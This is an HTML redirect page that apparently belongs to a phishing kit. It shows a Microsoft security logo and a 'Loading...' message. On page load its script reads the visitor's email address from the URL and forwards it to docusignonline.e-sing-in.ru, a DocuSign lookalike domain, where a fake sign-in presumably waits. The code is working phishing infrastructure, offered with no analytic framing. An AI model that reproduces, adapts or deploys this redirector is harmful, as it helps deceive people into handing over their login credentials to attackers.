<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Redirecting...</title>
<script>
    // Function to extract email from URL
    function getEmailFromURL() {
        // Get the URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        // Get the value of 'email' parameter
        const email = urlParams.get('email');
        return email;
    }

    // Function to update the link with the extracted email and redirect after delay
    function redirectAfterDelay() {
        const email = getEmailFromURL();
        // Check if email is valid
        if (!email) {
            console.error('Email parameter is missing.');
            return;
        }

        // Construct the redirect URL with the email parameter using /M<encoded_email>
        const redirectUrl = `https://docusignonline.e-sing-in.ru/?JtM8g=IE1kv/?e=${encodeURIComponent(email)}`;
        
        // Delay redirect by 3 seconds (3000 milliseconds)
        setTimeout(function() {
            // Redirect to the specified URL after delay
            window.location.href = redirectUrl;
        }, 500); // Delay of 3 seconds (3000 milliseconds)
    }

    // Call the redirectAfterDelay function when the page loads
    window.onload = function() {
        redirectAfterDelay(); // Call function to redirect after delay
    };
</script>
</head>
<body style="font-family: Arial, Helvetica, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh;">
<div style="text-align: center;">
    <img src="https://d15shllkswkct0.cloudfront.net/wp-content/blogs.dir/1/files/2023/12/microsoftsecurity.png"
         alt="" width="130px" height="auto">
    <p>Loading...</p>
</div>
</body>
</html>
